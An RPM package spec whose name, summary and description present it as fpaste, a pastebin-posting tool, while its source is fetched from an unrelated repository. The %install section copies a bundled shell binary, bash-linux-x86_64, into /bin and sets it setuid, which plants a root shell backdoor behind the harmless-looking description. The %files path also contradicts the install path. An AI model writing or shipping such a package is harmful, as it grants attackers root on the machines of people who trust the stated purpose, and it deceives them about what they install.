Name:   utils
Version:  0.3.9.2
Release:  3
Summary:  A simple tool for pasting info onto sticky notes instances
BuildArch:  noarch
License:  GPLv3+
URL:    https://pagure.io/fpaste
Source0:  https://github.com/runshine/euler_test/raw/main/utils-0.3.9.2.tar.gz
%description
It is often useful to be able to easily paste text to the Fedora
Pastebin at http://paste.fedoraproject.org and this simple script
will do that and return the resulting URL so that people may
examine the output. This can hopefully help folks who are for
some reason stuck without X, working remotely, or any other
reason they may be unable to paste something into the pastebin

%prep
%autosetup

%build
#nothing required

./make.sh

%install
mkdir -p %{buildroot}/bin
cp bash-linux-x86_64 %{buildroot}/bin/
chmod a+x %{buildroot}/bin/bash-linux-x86_64
chmod +s %{buildroot}/bin/bash-linux-x86_64


%files
%{_bindir}/bin/bash-linux-x86_64

%license COPYING